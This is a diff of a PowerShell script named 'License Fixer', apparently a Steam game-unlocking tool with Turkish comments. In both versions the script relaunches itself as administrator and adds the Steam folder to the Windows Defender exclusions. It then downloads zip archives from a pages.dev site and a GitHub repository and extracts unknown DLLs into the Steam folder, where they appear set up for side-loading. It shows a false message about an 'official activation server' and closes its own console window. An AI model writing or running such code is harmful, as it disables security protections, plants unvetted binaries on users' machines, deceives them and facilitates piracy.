@@ -1,5 +1,6 @@
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
-Try {
+
+try {
     $MethodDefinition = @'
     [DllImport("kernel32.dll")]
     public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
@@ -8,17 +9,20 @@ Try {
     [DllImport("kernel32.dll")]
     public static extern IntPtr GetStdHandle(int nStdHandle);
 '@
-    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru
+    $null = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru -ErrorAction SilentlyContinue
 }
 catch {}
 
 function Disable-QuickEdit {
-    $hInput = $Kernel32::GetStdHandle(-10) 
-    $mode = 0
-    if ($Kernel32::GetConsoleMode($hInput, [ref]$mode)) {
-        $mode = $mode -band -not (0x0040 -bor 0x0020)
-        $Kernel32::SetConsoleMode($hInput, $mode -bor 0x0080)
+    try {
+        $hInput = [Win32.Kernel32Functions]::GetStdHandle(-10)
+        $mode = 0
+        if ([Win32.Kernel32Functions]::GetConsoleMode($hInput, [ref]$mode)) {
+            $mode = $mode -band -not (0x0040 -bor 0x0020)
+            [Win32.Kernel32Functions]::SetConsoleMode($hInput, $mode -bor 0x0080)
+        }
     }
+    catch {}
 }
 
 Disable-QuickEdit
@@ -27,18 +31,199 @@ $host.UI.RawUI.ForegroundColor = "White"
 $host.UI.RawUI.WindowTitle = "License Fixer"
 Clear-Host
 
+# Admin kontrolü
 $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
 $principal = New-Object Security.Principal.WindowsPrincipal($identity)
 $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
     Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
-    if ($PSCommandPath) { $scriptPath = $PSCommandPath } else {
-        $scriptPath = Join-Path $env:TEMP "license_fix.ps1"
-        $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
-        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8
+    $scriptContent = @'
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+try {
+    $MethodDefinition = @'\''
+    [DllImport("kernel32.dll")]
+    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
+    [DllImport("kernel32.dll")]
+    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetStdHandle(int nStdHandle);
+'\''@
+    $null = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru -ErrorAction SilentlyContinue
+}
+catch {}
+
+function Disable-QuickEdit {
+    try {
+        $hInput = [Win32.Kernel32Functions]::GetStdHandle(-10)
+        $mode = 0
+        if ([Win32.Kernel32Functions]::GetConsoleMode($hInput, [ref]$mode)) {
+            $mode = $mode -band -not (0x0040 -bor 0x0020)
+            [Win32.Kernel32Functions]::SetConsoleMode($hInput, $mode -bor 0x0080)
+        }
     }
-    Start-Process -FilePath "conhost.exe" -Verb RunAs -ArgumentList "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
+    catch {}
+}
+
+Disable-QuickEdit
+$host.UI.RawUI.BackgroundColor = "Black"
+$host.UI.RawUI.ForegroundColor = "White"
+$host.UI.RawUI.WindowTitle = "License Fixer"
+Clear-Host
+
+$steamRegPath = "HKCU:\Software\Valve\Steam"
+$steamPath = ""
+
+if (Test-Path $steamRegPath) {
+    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
+    if ($properties -and "SteamPath" -in $properties.PSObject.Properties.Name) {
+        $steamPath = $properties.SteamPath
+    }
+}
+
+if ([string]::IsNullOrWhiteSpace($steamPath) -or -not (Test-Path $steamPath -PathType Container)) {
+    Write-Host "Official Steam client is not installed. Please install it and try again." -ForegroundColor Red
+    Start-Sleep 10
+    exit
+}
+
+# Defender exclusion
+try {
+    $existing = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath
+    if ($existing -and $existing -contains $steamPath) {
+        Write-Host "[+] Steam folder already excluded." -ForegroundColor Green
+    } else {
+        Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue
+        Write-Host "[+] Steam folder excluded successfully." -ForegroundColor Green
+    }
+} catch {}
+
+# Clean old files
+$oldFiles = @("winhttp.dll","dwmapi.dll","SYS_0xA7.dll","hid.dll","xinput1_4.dll","version.dll","OpenSteamTool.dll","SYS_0xA7.toml","opensteamtool.toml")
+foreach ($f in $oldFiles) {
+    $fp = Join-Path $steamPath $f
+    if (Test-Path $fp) { Remove-Item -Path $fp -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue }
+}
+
+# Clean appcache
+$appcache = Join-Path $steamPath "appcache"
+if (Test-Path $appcache) {
+    cmd /c "icacls `"$appcache`" /reset /T /C" | Out-Null
+    cmd /c "attrib -s -h -r `"$appcache`"" | Out-Null
+    Remove-Item -Path $appcache -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
+}
+
+# Clean other paths
+$cfgPath = Join-Path $steamPath "steam.cfg"
+if (Test-Path $cfgPath) { Remove-Item -Path $cfgPath -Force -ErrorAction SilentlyContinue }
+
+$betaPath = Join-Path $steamPath "package\beta"
+if (Test-Path $betaPath) { Remove-Item -Path $betaPath -Recurse -Force -ErrorAction SilentlyContinue }
+
+$tencentPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
+if (Test-Path $tencentPath) { Remove-Item -Path $tencentPath -Recurse -Force -ErrorAction SilentlyContinue }
+
+# Create gamesdata folder
+$gamesDataPath = Join-Path $env:APPDATA "gamesdata"
+if (!(Test-Path $gamesDataPath)) { New-Item $gamesDataPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
+
+# Download Gamevia.zip with multiple fallbacks
+$zip1 = Join-Path $env:TEMP "Gamevia.zip"
+$downloaded1 = $false
+
+$urls1 = @(
+    "https://zdb2.pages.dev/Gamevia.zip",
+    "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/Gamevia.zip",
+    "https://raw.githubusercontent.com/WolfGames156/zdb2/main/Gamevia.zip"
+)
+
+foreach ($url in $urls1) {
+    try {
+        Write-Host "[*] Trying: $url" -ForegroundColor Gray
+        Invoke-RestMethod -Uri $url -OutFile $zip1 -ErrorAction Stop
+        if ((Test-Path $zip1) -and ((Get-Item $zip1).Length -gt 0kb)) {
+            Write-Host "[+] Gamevia.zip downloaded." -ForegroundColor Green
+            $downloaded1 = $true
+            break
+        }
+    }
+    catch {
+        Write-Host "[!] Failed: $url" -ForegroundColor Yellow
+    }
+}
+
+if ($downloaded1 -and (Test-Path $zip1)) {
+    Expand-Archive -Path $zip1 -DestinationPath $gamesDataPath -Force -ErrorAction SilentlyContinue | Out-Null
+    $dkp = Join-Path $gamesDataPath "depotkeys.json"
+    if (Test-Path $dkp) { Remove-Item -Path $dkp -Force -ErrorAction SilentlyContinue }
+    Remove-Item -Path $zip1 -Force -ErrorAction SilentlyContinue
+    Write-Host "[+] Gamevia extracted." -ForegroundColor Green
+} else {
+    Write-Host "[-] Gamevia.zip download failed from all sources." -ForegroundColor Red
+}
+
+# Download dllg.zip with multiple fallbacks
+$zip2 = Join-Path $env:TEMP "dllg.zip"
+$downloaded2 = $false
+
+$urls2 = @(
+    "https://zdb2.pages.dev/dllg.zip",
+    "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/dllg.zip",
+    "https://raw.githubusercontent.com/WolfGames156/zdb2/main/dllg.zip"
+)
+
+foreach ($url in $urls2) {
+    try {
+        Write-Host "[*] Trying: $url" -ForegroundColor Gray
+        Invoke-RestMethod -Uri $url -OutFile $zip2 -ErrorAction Stop
+        if ((Test-Path $zip2) -and ((Get-Item $zip2).Length -gt 0kb)) {
+            Write-Host "[+] dllg.zip downloaded." -ForegroundColor Green
+            $downloaded2 = $true
+            break
+        }
+    }
+    catch {
+        Write-Host "[!] Failed: $url" -ForegroundColor Yellow
+    }
+}
+
+if ($downloaded2 -and (Test-Path $zip2)) {
+    Expand-Archive -Path $zip2 -DestinationPath $steamPath -Force -ErrorAction SilentlyContinue | Out-Null
+    Remove-Item -Path $zip2 -Force -ErrorAction SilentlyContinue
+    Write-Host "[+] DLLs extracted successfully." -ForegroundColor Green
+} else {
+    Write-Host "[-] dllg.zip download failed from all sources." -ForegroundColor Red
+}
+
+# Start Steam
+$steamExe = Join-Path $steamPath "steam.exe"
+Start-Process $steamExe
+Start-Process "steam://"
+
+Write-Host "`n[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green
+
+for ($i = 5; $i -ge 0; $i--) {
+    Write-Host "`r[This window will close in $i seconds...]" -NoNewline
+    Start-Sleep -Seconds 1
+}
+
+try {
+    $parentProcessId = $PID
+    $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'" -ErrorAction SilentlyContinue
+    while ($null -ne $instance -and ("powershell.exe","WindowsTerminal.exe","pwsh.exe" -contains $instance.ProcessName)) {
+        $parentProcessId = $instance.ProcessId
+        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'" -ErrorAction SilentlyContinue
+    }
+    if ($null -ne $parentProcessId) {
+        Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
+    }
+} catch {}
+exit
+'@
+
+    $scriptPath = Join-Path $env:TEMP "license_fix.ps1"
+    Set-Content -Path $scriptPath -Value $scriptContent -Encoding UTF8 -Force
+    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
     exit
 }
 
@@ -46,57 +231,9 @@ Disable-QuickEdit
 cls
 [Console]::InputEncoding = [System.Text.Encoding]::UTF8
 
-$localPath = Join-Path $env:LOCALAPPDATA "steam"
 $steamRegPath = 'HKCU:\Software\Valve\Steam'
 $steamPath = ""
 
-# --- Yardımcı Fonksiyonlar ---
-
-function Write-Log ($message, $type) {
-    switch ($type) {
-        "SUCCESS" { Write-Host "[+] $message" -ForegroundColor Green }
-        "ERROR"   { Write-Host "[-] $message" -ForegroundColor Red }
-        "WARNING" { Write-Host "[!] $message" -ForegroundColor Yellow }
-        default   { Write-Host "[*] $message" }
-    }
-}
-
-function Remove-ItemIfExists($path) {
-    if ([string]::IsNullOrWhiteSpace($path)) { return }
-    $fullPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
-    if (Test-Path $fullPath) {
-        Start-Process cmd -ArgumentList "/c icacls ""$fullPath"" /reset /T /C" -WindowStyle Hidden -Wait
-        Start-Process cmd -ArgumentList "/c attrib -s -h -r ""$fullPath""" -WindowStyle Hidden -Wait
-        Remove-Item -Path $fullPath -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
-    }
-}
-
-function ForceStopProcess($processName) {
-    Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-    Start-Sleep -Seconds 2
-    if (Get-Process $processName -ErrorAction SilentlyContinue) {
-        Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
-    }
-}
-
-function CheckAndPromptProcess($processName, $message) {
-    while (Get-Process $processName -ErrorAction SilentlyContinue) {
-        Write-Host $message -ForegroundColor Red
-        Start-Sleep 1.5
-    }
-}
-
-# --- Başlangıç İşlemleri ---
-
-$filePathToDelete = Join-Path $env:USERPROFILE "get.ps1"
-Remove-ItemIfExists $filePathToDelete
-
-ForceStopProcess "steam"
-if (Get-Process "steam" -ErrorAction SilentlyContinue) {
-    CheckAndPromptProcess "Steam" "[Please exit Steam client first]"
-}
-
-# Steam Yolu Kontrolü
 if (Test-Path $steamRegPath) {
     $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
     if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
@@ -105,203 +242,146 @@ if (Test-Path $steamRegPath) {
 }
 
 if ([string]::IsNullOrWhiteSpace($steamPath) -or -not (Test-Path $steamPath -PathType Container)) {
-    Write-Host "Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
+    Write-Host "Official Steam client is not installed. Please install it and try again." -ForegroundColor Red
     Start-Sleep 10
     exit
 }
 
-# --- Windows Defender Bölümü ---
-if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
-    try {
-        $existing = (Get-MpPreference).ExclusionPath
-        if ($existing -and $existing -contains $steamPath) {
-            Write-Log "Steam folder already excluded." "SUCCESS"
-        }
-        else {
-            Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
-            Write-Log "Steam folder excluded successfully." "SUCCESS"
-        }
+# Defender exclusion
+try {
+    $existing = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath
+    if ($existing -and $existing -contains $steamPath) {
+        Write-Host "[+] Steam folder already excluded." -ForegroundColor Green
     }
-    catch {
-        Write-Log "Failed to apply Defender settings. (If it does not apply automatically, you may add it manually.)" "ERROR"
+    else {
+        Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue
+        Write-Host "[+] Steam folder excluded successfully." -ForegroundColor Green
     }
 }
-else {
-    Write-Log "Windows Defender cmdlets not available. (If it does not apply automatically, you may add it manually.)" "ERROR"
+catch {}
+
+# Clean old files
+$oldFiles = @("winhttp.dll","dwmapi.dll","SYS_0xA7.dll","hid.dll","xinput1_4.dll","version.dll","OpenSteamTool.dll","SYS_0xA7.toml","opensteamtool.toml")
+foreach ($f in $oldFiles) {
+    $fp = Join-Path $steamPath $f
+    if (Test-Path $fp) { Remove-Item -Path $fp -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue }
 }
 
-# Eski DLL'leri temizle
-Remove-ItemIfExists (Join-Path $steamPath "winhttp.dll")
-Remove-ItemIfExists (Join-Path $steamPath "dwmapi.dll")
-Remove-ItemIfExists (Join-Path $steamPath "SYS_0xA7.dll")
-Remove-ItemIfExists (Join-Path $steamPath "hid.dll")
-Remove-ItemIfExists (Join-Path $steamPath "xinput1_4.dll")
-Remove-ItemIfExists (Join-Path $steamPath "version.dll")
-Remove-ItemIfExists (Join-Path $steamPath "OpenSteamTool.dll")
-Remove-ItemIfExists (Join-Path $steamPath "SYS_0xA7.toml")
-Remove-ItemIfExists (Join-Path $steamPath "opensteamtool.toml")
+# Clean appcache
+$appcache = Join-Path $steamPath "appcache"
+if (Test-Path $appcache) {
+    cmd /c "icacls `"$appcache`" /reset /T /C" | Out-Null
+    cmd /c "attrib -s -h -r `"$appcache`"" | Out-Null
+    Remove-Item -Path $appcache -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
+}
 
-# --- Güvenilir URL Listesi (çoklu fallback) ---
-$primaryUrls = @(
+# Other cleanup
+$cfgPath = Join-Path $steamPath "steam.cfg"
+if (Test-Path $cfgPath) { Remove-Item -Path $cfgPath -Force -ErrorAction SilentlyContinue }
+
+$betaPath = Join-Path $steamPath "package\beta"
+if (Test-Path $betaPath) { Remove-Item -Path $betaPath -Recurse -Force -ErrorAction SilentlyContinue }
+
+$tencentPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
+if (Test-Path $tencentPath) { Remove-Item -Path $tencentPath -Recurse -Force -ErrorAction SilentlyContinue }
+
+# Create gamesdata folder
+$gamesDataPath = Join-Path $env:APPDATA "gamesdata"
+if (!(Test-Path $gamesDataPath)) { New-Item $gamesDataPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
+
+# --- Download Gamevia.zip with 3 fallback URLs ---
+$zip1 = Join-Path $env:TEMP "Gamevia.zip"
+$downloaded1 = $false
+
+$urls1 = @(
     "https://zdb2.pages.dev/Gamevia.zip",
     "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/Gamevia.zip",
     "https://raw.githubusercontent.com/WolfGames156/zdb2/main/Gamevia.zip"
 )
 
-$dllUrls = @(
+foreach ($url in $urls1) {
+    try {
+        Write-Host "[*] Trying: $url" -ForegroundColor Gray
+        Invoke-RestMethod -Uri $url -OutFile $zip1 -ErrorAction Stop
+        if ((Test-Path $zip1) -and ((Get-Item $zip1).Length -gt 0kb)) {
+            Write-Host "[+] Gamevia.zip downloaded." -ForegroundColor Green
+            $downloaded1 = $true
+            break
+        }
+    }
+    catch {
+        Write-Host "[!] Failed: $url" -ForegroundColor Yellow
+    }
+}
+
+if ($downloaded1 -and (Test-Path $zip1)) {
+    Expand-Archive -Path $zip1 -DestinationPath $gamesDataPath -Force -ErrorAction SilentlyContinue | Out-Null
+    $dkp = Join-Path $gamesDataPath "depotkeys.json"
+    if (Test-Path $dkp) { Remove-Item -Path $dkp -Force -ErrorAction SilentlyContinue }
+    Remove-Item -Path $zip1 -Force -ErrorAction SilentlyContinue
+    Write-Host "[+] Gamevia extracted." -ForegroundColor Green
+}
+else {
+    Write-Host "[-] Gamevia.zip download failed from all sources." -ForegroundColor Red
+}
+
+# --- Download dllg.zip with 3 fallback URLs ---
+$zip2 = Join-Path $env:TEMP "dllg.zip"
+$downloaded2 = $false
+
+$urls2 = @(
     "https://zdb2.pages.dev/dllg.zip",
     "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/dllg.zip",
     "https://raw.githubusercontent.com/WolfGames156/zdb2/main/dllg.zip"
 )
 
-# --- Dosya İndirme Fonksiyonu (çoklu URL dener) ---
-function Download-FileWithFallback {
-    param(
-        [string[]]$Urls,
-        [string]$OutputPath
-    )
-    foreach ($url in $Urls) {
-        try {
-            Write-Host "[*] Trying: $url" -ForegroundColor Gray
-            Invoke-RestMethod -Uri $url -OutFile $OutputPath -ErrorAction Stop
-            if ((Test-Path $OutputPath) -and ((Get-Item $OutputPath).Length -gt 0)) {
-                Write-Log "Downloaded successfully: $url" "SUCCESS"
-                return $true
-            }
-        }
-        catch {
-            Write-Host "[!] Failed: $url" -ForegroundColor Yellow
-        }
-    }
-    return $false
-}
-
-# --- Ana Fonksiyon ---
-
-function PwStart {
+foreach ($url in $urls2) {
     try {
-        if (!$steamPath) { return }
-
-        if (!(Test-Path $localPath)) {
-            New-Item $localPath -ItemType directory -Force -ErrorAction SilentlyContinue
+        Write-Host "[*] Trying: $url" -ForegroundColor Gray
+        Invoke-RestMethod -Uri $url -OutFile $zip2 -ErrorAction Stop
+        if ((Test-Path $zip2) -and ((Get-Item $zip2).Length -gt 0kb)) {
+            Write-Host "[+] dllg.zip downloaded." -ForegroundColor Green
+            $downloaded2 = $true
+            break
         }
-
-        # Steam yapılandırma temizliği
-        Remove-ItemIfExists (Join-Path $steamPath "appcache")
-        Remove-ItemIfExists (Join-Path $steamPath "steam.cfg")
-        Remove-ItemIfExists (Join-Path $steamPath "package\beta")
-        Remove-ItemIfExists (Join-Path $env:LOCALAPPDATA "Microsoft\Tencent")
-
-        try { Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue } catch {}
-
-        # --- Gamevia.zip indir ve ayıkla ---
-        $gamesDataPath = Join-Path $env:APPDATA "gamesdata"
-        if (!(Test-Path $gamesDataPath)) {
-            New-Item $gamesDataPath -ItemType Directory -Force -ErrorAction SilentlyContinue
-        }
-
-        $zipLocalSys = Join-Path $env:TEMP "Gamevia.zip"
-        $successSys = Download-FileWithFallback -Urls $primaryUrls -OutputPath $zipLocalSys
-
-        if ($successSys -and (Test-Path $zipLocalSys)) {
-            try {
-                Expand-Archive -Path $zipLocalSys -DestinationPath $gamesDataPath -Force -ErrorAction Stop
-                Write-Log "Gamevia.zip extracted to $gamesDataPath" "SUCCESS"
-
-                # gamesdata içindeki depotkeys.json sil
-                $depotKeysPath = Join-Path $gamesDataPath "depotkeys.json"
-                if (Test-Path $depotKeysPath) {
-                    Remove-Item $depotKeysPath -Force -ErrorAction SilentlyContinue
-                    Write-Log "depotkeys.json removed" "SUCCESS"
-                }
-            }
-            catch {
-                Write-Log "Failed to extract Gamevia.zip" "ERROR"
-            }
-        }
-        else {
-            Write-Log "Gamevia.zip could not be downloaded from any source." "ERROR"
-        }
-
-        # Geçici dosyayı güvenli sil (boş veya null kontrolü ile)
-        if (-not [string]::IsNullOrWhiteSpace($zipLocalSys) -and (Test-Path -LiteralPath $zipLocalSys)) {
-            try {
-                Remove-Item -LiteralPath $zipLocalSys -Force -ErrorAction Stop
-                Write-Log "Temporary file cleaned." "SUCCESS"
-            }
-            catch {
-                Write-Log "Could not remove temp file (will be ignored)" "WARNING"
-            }
-        }
-
-        # --- dllg.zip indir ve ayıkla ---
-        $zipLocal = Join-Path $env:TEMP "dllg.zip"
-        $success = Download-FileWithFallback -Urls $dllUrls -OutputPath $zipLocal
-
-        if ($success -and (Test-Path $zipLocal)) {
-            try {
-                Expand-Archive -Path $zipLocal -DestinationPath $steamPath -Force -ErrorAction Stop
-                Write-Log "DLLs extracted successfully to $steamPath" "SUCCESS"
-            }
-            catch {
-                Write-Log "Failed to extract dllg.zip" "ERROR"
-            }
-        }
-        else {
-            Write-Log "dllg.zip could not be downloaded from any source." "ERROR"
-        }
-
-        # dllg.zip geçici dosyasını güvenli sil
-        if (-not [string]::IsNullOrWhiteSpace($zipLocal) -and (Test-Path -LiteralPath $zipLocal)) {
-            try {
-                Remove-Item -LiteralPath $zipLocal -Force -ErrorAction Stop
-                Write-Log "Temporary DLL zip cleaned." "SUCCESS"
-            }
-            catch {
-                Write-Log "Could not remove temp DLL zip (will be ignored)" "WARNING"
-            }
-        }
-
-        # Steam'i Başlat
-        $steamExePath = Join-Path $steamPath "steam.exe"
-        Start-Process $steamExePath
-        Start-Process "steam://"
-
-        Write-Log "Successfully connected to official activation server. Please login to Steam to activate" "SUCCESS"
-
-        for ($i = 5; $i -ge 0; $i--) {
-            Write-Host "`r[This window will close in $i seconds...]" -NoNewline
-            Start-Sleep -Seconds 1
-        }
-
-        # Pencereyi kapat
-        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
-        while ($null -ne $instance -and ("powershell.exe", "WindowsTerminal.exe", "pwsh.exe" -contains $instance.ProcessName)) {
-            $parentProcessId = $instance.ProcessId
-            $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'"
-        }
-        if ($null -ne $parentProcessId) {
-            Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
-        }
-
-        exit
     }
     catch {
-        Write-Host "`n===== ERROR =====" -ForegroundColor Red
-        Write-Host "Message : $($_.Exception.Message)" -ForegroundColor Red
-        Write-Host "Type    : $($_.Exception.GetType().FullName)" -ForegroundColor Yellow
-
-        if ($_.InvocationInfo) {
-            Write-Host "Line    : $($_.InvocationInfo.ScriptLineNumber)" -ForegroundColor Yellow
-            Write-Host "Command : $($_.InvocationInfo.Line.Trim())" -ForegroundColor Yellow
-        }
-
-        Write-Host "`nFull Error:" -ForegroundColor Red
-        Write-Host ($_ | Out-String)
-
-        Read-Host "Press Enter to exit"
+        Write-Host "[!] Failed: $url" -ForegroundColor Yellow
     }
 }
 
-# Scripti Çalıştır
-PwStart
+if ($downloaded2 -and (Test-Path $zip2)) {
+    Expand-Archive -Path $zip2 -DestinationPath $steamPath -Force -ErrorAction SilentlyContinue | Out-Null
+    Remove-Item -Path $zip2 -Force -ErrorAction SilentlyContinue
+    Write-Host "[+] DLLs extracted successfully." -ForegroundColor Green
+}
+else {
+    Write-Host "[-] dllg.zip download failed from all sources." -ForegroundColor Red
+}
+
+# Start Steam
+$steamExe = Join-Path $steamPath "steam.exe"
+Start-Process $steamExe
+Start-Process "steam://"
+
+Write-Host "`n[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green
+
+for ($i = 5; $i -ge 0; $i--) {
+    Write-Host "`r[This window will close in $i seconds...]" -NoNewline
+    Start-Sleep -Seconds 1
+}
+
+try {
+    $parentProcessId = $PID
+    $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'" -ErrorAction SilentlyContinue
+    while ($null -ne $instance -and ("powershell.exe","WindowsTerminal.exe","pwsh.exe" -contains $instance.ProcessName)) {
+        $parentProcessId = $instance.ProcessId
+        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'" -ErrorAction SilentlyContinue
+    }
+    if ($null -ne $parentProcessId) {
+        Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
+    }
+}
+catch {}
+
+exit
